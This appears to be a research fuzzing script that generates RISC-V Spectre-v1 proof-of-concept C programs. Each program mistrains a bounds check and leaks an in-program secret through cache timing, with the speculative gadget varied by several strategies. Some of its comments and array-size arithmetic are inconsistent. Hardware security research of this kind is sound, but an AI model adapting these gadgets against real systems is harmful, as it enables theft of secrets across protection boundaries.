#!/usr/bin/env python3
"""
fuzz_gen.py – Template-based test-case generator for transient-execution
(Spectre-v1) attacks on RISC-V (RV64GC).

The fixed template is the conditional-branch misprediction victim from
condBranchMispred.c.  Only the *transient execution block* – the instructions
that run speculatively after the bounds-check branch – is varied.  Everything
else (the slow dependency chain, the bounds check itself, the main attack
harness) stays identical across all generated test cases.

Usage
-----
    python3 fuzz_gen.py [-n NUM_CASES] [-o OUTPUT_DIR] [-s SEED]
                        [--strategy {standard,varied_shift,arithmetic,multi_load,random_loads,jump_replace,random}]

Examples
--------
    # 20 random test cases in fuzz_cases/
    python3 fuzz_gen.py -n 20

    # Reproducible run, arithmetic strategy only
    python3 fuzz_gen.py -n 10 -s 42 --strategy arithmetic

    # Custom output directory
    python3 fuzz_gen.py -n 5 -o /tmp/spectre_cases
"""

import argparse
import itertools
import os
import random
import sys

# ---------------------------------------------------------------------------
# RISC-V instruction tables
# ---------------------------------------------------------------------------

# Register pool available inside the transient block.
# a1 = idx, a2 = array1 ptr, a3 = array2 ptr — treat as read-only inputs.
# a4 is the primary working register (also the clobber register for the
# secret load and cache-encode sequence).
TEMP_REGS = ["a4", "a6", "a7", "t0", "t1", "t2", "t3", "t4", "t5", "t6"]

# RV64I arithmetic (rd, rs1, rs2)
ARITH_RRR = [
    "add", "sub", "and", "or", "xor",
    "sll", "srl", "sra",
    "addw", "subw",
    "mul",
]

# RV64I arithmetic with immediate (rd, rs1, imm)
ARITH_RRI = [
    ("addi",  (-2048, 2047)),
    ("addiw", (-2048, 2047)),
    ("andi",  (-2048, 2047)),
    ("ori",   (-2048, 2047)),
    ("xori",  (-2048, 2047)),
    ("slli",  (0, 63)),
    ("srli",  (0, 63)),
    ("srai",  (0, 63)),
]

# Load instructions (rd, offset(rs1))
LOAD_INSTRS = ["lb", "lbu", "lh", "lhu", "lw", "lwu", "ld"]

# All clobber registers that may be written by generated instructions
CLOBBER_REGS = ["a4", "a6", "a7", "t0", "t1", "t2", "t3", "t4", "t5", "t6"]

# ---------------------------------------------------------------------------
# Instruction generators
# ---------------------------------------------------------------------------

def _rrr(op, dst, src1, src2):
    return f'"{op} {dst}, {src1}, {src2}\\n\\t"'


def _rri(op, dst, src, imm):
    return f'"{op} {dst}, {src}, {imm}\\n\\t"'


def _load(op, dst, offset, base):
    return f'"{op} {dst}, {offset}({base})\\n\\t"'


def rand_temp():
    return random.choice(TEMP_REGS)


def rand_arith_rri(dst=None, src=None):
    op, (lo, hi) = random.choice(ARITH_RRI)
    imm = random.randint(lo, hi)
    d = dst if dst else rand_temp()
    s = src if src else rand_temp()
    return _rri(op, d, s, imm)


def rand_arith_rrr(dst=None, src1=None, src2=None):
    op = random.choice(ARITH_RRR)
    d  = dst  if dst  else rand_temp()
    s1 = src1 if src1 else rand_temp()
    s2 = src2 if src2 else rand_temp()
    return _rrr(op, d, s1, s2)


# ---------------------------------------------------------------------------
# Transient-block strategies
# ---------------------------------------------------------------------------

def _secret_load():
    """Load secret byte from array1[idx] into a4."""
    return [
        '"add a4, a2, a1\\n\\t"',  # a4 = &array1[idx]
        '"lbu a4, 0(a4)\\n\\t"',   # a4 = array1[idx]
    ]


def _cache_encode(shift=6):
    """Encode a4 into a cache-line index and access array2."""
    return [
        f'"slli a4, a4, {shift}\\n\\t"',  # a4 = secret * (1 << shift)
        '"add a4, a3, a4\\n\\t"',          # a4 = &array2[secret * stride]
        '"lbu a4, 0(a4)\\n\\t"',           # touch cache line
    ]


# --- Strategy 1: standard (identical to original) --------------------------

def strategy_standard():
    """The original Spectre gadget, shift=6."""
    return _secret_load() + _cache_encode(shift=6)


# --- Strategy 2: varied shift ----------------------------------------------

def strategy_varied_shift():
    """Same structure as standard, but stride is randomised.

    Shift range 4–8 bits covers:
      - 4-bit shift → stride 16 B  (sub-cache-line)
      - 6-bit shift → stride 64 B  (one L1 cache line, classic Spectre)
      - 8-bit shift → stride 256 B (quarter of 1 KB)
    All values still keep the 256 possible byte values within array2
    (max index = 255 * 256 = 65 280 B < 256 * 64 = 16 384 B only at shift 6;
    at shift 8 array2 must be ≥ 256*256 bytes – use with care).
    """
    shift = random.randint(4, 7)  # cap at 7 to stay within 256*128 = 32 KB
    return _secret_load() + _cache_encode(shift=shift)


# --- Strategy 3: arithmetic transforms ------------------------------------

def strategy_arithmetic(num_transforms=None):
    """
    Insert random arithmetic/logical instructions between the secret load and
    the cache-encode step.  The byte range is clamped before the encode to
    keep the access within array2.
    """
    if num_transforms is None:
        num_transforms = random.randint(1, 6)

    instrs = _secret_load()

    for _ in range(num_transforms):
        choice = random.choice(["rrr", "rri"])
        if choice == "rrr":
            # Operate on a4 with a random temp register
            instrs.append(rand_arith_rrr(dst="a4", src1="a4", src2=rand_temp()))
        else:
            instrs.append(rand_arith_rri(dst="a4", src="a4"))

    # Clamp back to [0, 255] so the array2 access stays in bounds
    instrs.append('"andi a4, a4, 255\\n\\t"')
    instrs += _cache_encode(shift=random.choice([4, 5, 6, 7]))
    return instrs


# --- Strategy 4: multi-load ------------------------------------------------

def strategy_multi_load():
    """
    Load from a second (derived) index within array1, combine the two bytes,
    then encode in the cache.
    """
    instrs = _secret_load()  # a4 = array1[idx]

    # Derive a second index: keep it within array1 bounds (mask to 0–15)
    instrs += [
        '"andi t0, a4, 15\\n\\t"',    # t0 = a4 & 15
        '"add  t0, a2, t0\\n\\t"',    # t0 = &array1[a4 & 15]
        '"lbu  t0, 0(t0)\\n\\t"',     # t0 = array1[a4 & 15]
        '"xor  a4, a4, t0\\n\\t"',    # combine two secret bytes
        '"andi a4, a4, 255\\n\\t"',   # clamp to byte range
    ]
    instrs += _cache_encode(shift=6)
    return instrs


# --- Strategy 5: random extra loads before encode -------------------------


def strategy_random_loads(num_extra=None):
    """
    Insert one or more speculative loads from random temp registers (which may
    hold arbitrary / stale values) before the final cache-encode step.

    This intentionally creates unpredictable memory accesses during the
    transient window to test whether those spurious loads influence the cache
    timing channel observed by the attacker.  The core secret-load and
    cache-encode steps are still present to ensure the timing channel exists.
    """
    if num_extra is None:
        num_extra = random.randint(1, 4)

    instrs = _secret_load()  # a4 = array1[idx]

    for _ in range(num_extra):
        # Load from a random temp register (possibly uninitialized /
        # holding stale data) — intentionally fuzzy
        tmp = rand_temp()
        load_op = random.choice(LOAD_INSTRS)
        offset = random.choice([0, 8, 16, 32, 64])
        instrs.append(_load(load_op, rand_temp(), offset, tmp))

    instrs.append('"andi a4, a4, 255\\n\\t"')
    instrs += _cache_encode(shift=6)
    return instrs


# --- Strategy 6: jump replacement -----------------------------------------

# Conditional branch instructions available in RISC-V (rs1, rs2, offset form).
# All six comparison variants are included so the fuzzer explores the full
# range of branch-predictor behaviour during speculative execution.
COND_BRANCHES = ["beq", "bne", "blt", "bge", "bltu", "bgeu"]

# Jump flavours injected by strategy_jump_replace.
JUMP_TYPES = ["cond_branch", "jal", "jalr"]


def strategy_jump_replace(num_jumps=None):
    """
    Inject jump and branch instructions inside the transient execution block.

    Three kinds of control-flow injection are chosen uniformly at random:

    * **cond_branch** – a conditional branch whose outcome depends on the
      (possibly dirty) secret byte in ``a4`` vs. a random temp register.
      The branch skips over one arithmetic instruction, creating a nested
      speculative path inside the outer misprediction window.

    * **jal** – an unconditional short forward jump (``jal zero, <label>``)
      that skips one arithmetic instruction.  The skipped instruction is
      architecturally dead but may still be decoded speculatively, probing
      the CPU's fetch-ahead behaviour.

    * **jalr** – an indirect jump through a register loaded with ``la``.
      This exercises the indirect-branch predictor (IBP / BTB) in addition
      to the conditional branch predictor, widening the attack surface.

    In all cases the core Spectre gadget (secret load + cache encode) is
    preserved.  Labels start at 2 because label ``1`` is already used by the
    outer bounds-check jump target in the fixed template.
    """
    if num_jumps is None:
        num_jumps = random.randint(1, 4)

    instrs = _secret_load()  # a4 = array1[idx]

    # Labels start at 2; label 1 is taken by the outer bounds-check target.
    labels = itertools.count(2)

    for _ in range(num_jumps):
        choice = random.choice(JUMP_TYPES)
        lbl = next(labels)

        if choice == "cond_branch":
            # Branch over one arithmetic instruction; condition derived from
            # the secret byte (a4) compared to a random (possibly stale) reg.
            op = random.choice(COND_BRANCHES)
            tmp = rand_temp()
            instrs.append(f'"{op} a4, {tmp}, {lbl}f\\n\\t"')
            instrs.append(rand_arith_rri(dst="a4", src="a4"))
            instrs.append(f'"{lbl}:\\n\\t"')

        elif choice == "jal":
            # Unconditional forward jump; skipped instruction is
            # architecturally dead but may still enter the speculative pipeline.
            instrs.append(f'"jal zero, {lbl}f\\n\\t"')
            instrs.append(rand_arith_rri(dst="a4", src="a4"))  # speculative dead code
            instrs.append(f'"{lbl}:\\n\\t"')

        else:  # jalr – indirect jump through a register
            tmp = rand_temp()
            instrs.append(f'"la {tmp}, {lbl}f\\n\\t"')
            instrs.append(f'"jalr zero, {tmp}, 0\\n\\t"')
            instrs.append(rand_arith_rri(dst="a4", src="a4"))  # speculative dead code
            instrs.append(f'"{lbl}:\\n\\t"')

    # Clamp secret to byte range and encode into the cache timing channel.
    instrs.append('"andi a4, a4, 255\\n\\t"')
    instrs += _cache_encode(shift=random.choice([4, 5, 6, 7]))
    return instrs


# ---------------------------------------------------------------------------
# Strategy dispatcher
# ---------------------------------------------------------------------------

STRATEGIES = {
    "standard":    strategy_standard,
    "varied_shift": strategy_varied_shift,
    "arithmetic":  strategy_arithmetic,
    "multi_load":  strategy_multi_load,
    "random_loads": strategy_random_loads,
    "jump_replace": strategy_jump_replace,
}

ALL_STRATEGIES = list(STRATEGIES.keys())


# ---------------------------------------------------------------------------
# C file template
# ---------------------------------------------------------------------------

_C_HEADER = """\
/* Auto-generated by fuzz_gen.py  –  case {case_id}  strategy: {strategy} */
#include <stdint.h>
#include <stdlib.h>
#include "encoding.h"
#include "cache.h"

uint8_t array1[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
char secretString[32] = "Spectre_Secret_XJCGTL";
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

void victimFunc(uint64_t idx){{
    asm volatile(
        "mv      a1, %[idx]\\n\\t"
        "mv      a2, %[array1]\\n\\t"
        "mv      a3, %[array2]\\n\\t"
        "li      a4, 2\\n\\t"
        "li      a5, 1\\n\\t"
        /* Build array1 size via slow FP chain to allow branch misprediction */
        "slli a5, a5, 4\\n\\t"
        "slli a5, a5, 4\\n\\t"
        "fcvt.s.lu fa4, a4\\n\\t"
        "fcvt.s.lu fa5, a5\\n\\t"
        "fdiv.s fa5, fa5, fa4\\n\\t"
        "fdiv.s fa5, fa5, fa4\\n\\t"
        "fdiv.s fa5, fa5, fa4\\n\\t"
        "fdiv.s fa5, fa5, fa4\\n\\t"
        "fcvt.lu.s a5, fa5, rtz\\n\\t"
        /* Bounds check – branch is mispredicted during training */
        "bltu a5, a1, 1f\\n\\t"
"""

_C_FOOTER = """\
        "1:\\n\\t"
        "rdcycle a5\\n\\t"
        :
        : [idx]    "r" (idx),
          [array1] "r" (array1),
          [array2] "r" (array2)
        : {clobbers}
    );
}}

int main(void){{
    uint64_t attackIdx = (uint64_t)(secretString - (char *)array1);
    uint64_t passInIdx, trainIdx = 5, useless = 225103161;
    static uint64_t results[256];

    for (uint64_t cIdx = 0; cIdx < 256; ++cIdx)
        results[cIdx] = 0;

    for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {{
        useless ^= flushCache((uint64_t)array2, sizeof(array2));

        for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {{
            passInIdx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;
            passInIdx = (passInIdx | (passInIdx >> 16));
            passInIdx = trainIdx ^ (passInIdx & (attackIdx ^ trainIdx));
            victimFunc(passInIdx);
        }}
        ProbeCache(results);
    }}

    High_two_result(useless, results);
    return 0;
}}
"""


def build_clobber_string(extra_regs=None):
    """Build the GCC inline-asm clobber list string."""
    base = ["a1", "a2", "a3", "a4", "a5", "fa4", "fa5", "memory"]
    regs = base + (extra_regs if extra_regs else [])
    # Deduplicate while preserving order
    seen = set()
    unique = []
    for r in regs:
        if r not in seen:
            seen.add(r)
            unique.append(r)
    return ", ".join(f'"{r}"' for r in unique)


def gen_test_case(case_id, strategy_name, seed=None):
    """Return the full C source for one test case."""
    if seed is not None:
        random.seed(seed + case_id)

    fn = STRATEGIES[strategy_name]
    transient_instrs = fn()

    # Indent each instruction line inside the asm volatile block
    body = "\n".join(f"        {line}" for line in transient_instrs)

    # Build clobber list: add any extra temp registers the generated code uses
    extra = [r for r in CLOBBER_REGS if r != "a4"]
    clobber_str = build_clobber_string(extra)

    header = _C_HEADER.format(case_id=case_id, strategy=strategy_name)
    footer = _C_FOOTER.format(clobbers=clobber_str)

    return header + body + "\n" + footer


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="Generate Spectre-v1 (cond-branch mispred) test cases for RISC-V",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument(
        "-n", "--num-cases",
        type=int, default=10,
        metavar="N",
        help="number of test cases to generate (default: 10)",
    )
    p.add_argument(
        "-o", "--output-dir",
        default="fuzz_cases",
        metavar="DIR",
        help="output directory for generated .c files (default: fuzz_cases)",
    )
    p.add_argument(
        "-s", "--seed",
        type=int, default=None,
        metavar="SEED",
        help="random seed for reproducibility (default: non-deterministic)",
    )
    p.add_argument(
        "--strategy",
        choices=ALL_STRATEGIES + ["random"],
        default="random",
        help=(
            "transient-block generation strategy.  "
            "'random' picks a different strategy for each case (default)."
        ),
    )
    p.add_argument(
        "--list-strategies",
        action="store_true",
        help="list available strategies and exit",
    )
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    if args.list_strategies:
        print("Available strategies:")
        for name in ALL_STRATEGIES:
            print(f"  {name}")
        return 0

    if args.seed is not None:
        random.seed(args.seed)

    os.makedirs(args.output_dir, exist_ok=True)

    strategy_is_random = (args.strategy == "random")

    print(f"Generating {args.num_cases} test case(s) → '{args.output_dir}/'")

    for i in range(args.num_cases):
        strat = random.choice(ALL_STRATEGIES) if strategy_is_random else args.strategy
        source = gen_test_case(i, strat, seed=args.seed)
        path = os.path.join(args.output_dir, f"testcase_{i:04d}.c")
        with open(path, "w") as fh:
            fh.write(source)
        print(f"  [{i+1:>{len(str(args.num_cases))}}/{args.num_cases}] {path}  (strategy: {strat})")

    print()
    print("Done.  To cross-compile a case:")
    print("  riscv64-linux-gnu-gcc -O0 -march=rv64gc -o testcase \\")
    print(f"      {args.output_dir}/testcase_0000.c cache.c -lm")
    return 0


if __name__ == "__main__":
    sys.exit(main())
